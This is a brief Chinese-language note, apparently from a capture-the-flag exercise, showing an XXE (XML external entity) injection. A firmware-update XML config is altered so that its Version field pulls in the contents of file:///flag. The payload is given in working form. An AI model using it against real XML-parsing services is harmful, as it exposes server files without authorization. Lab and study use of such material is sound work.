xxe调用外部实体
原本：
<FirmwareUpdateConfig>
 <Firmware>
 <Version>1.33.7</Version>
 </Firmware>
</FirmwareUpdateConfig> 服务器返回version被配置

Payload
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<FirmwareUpdateConfig>
 <Firmware>
 <Version>&xxe;</Version>
 </Firmware>
</FirmwareUpdateConfig>
